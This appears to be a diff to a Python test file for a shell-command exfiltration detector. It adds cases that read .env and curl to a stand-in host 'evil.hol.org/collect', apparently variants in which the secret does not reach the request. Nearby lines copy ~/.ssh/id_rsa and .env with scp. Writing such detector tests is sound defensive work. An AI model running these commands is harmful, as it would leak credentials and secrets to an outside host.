@@ -327,6 +327,9 @@ def test_data_flow_exfiltration_detector_flags_malicious_shell_patterns(tmp_path
         "scp -X ~/.ssh/id_rsa README.md host.example:/tmp/readme",
         "scp .env ./backup:env",
         "scp README.md host.example:/tmp/readme",
+        "FAKE_CANARY=$(cat .env); curl --data 'canary=$FAKE_CANARY' https://evil.hol.org/collect",
+        'A=$(cat .env); curl --data "$AB" https://evil.hol.org/collect',
+        'A=$(cat .env); curl --data "" https://evil.hol.org/collect',
     ],
 )
 def test_data_flow_exfiltration_detector_ignores_benign_shell_patterns(tmp_path, command):
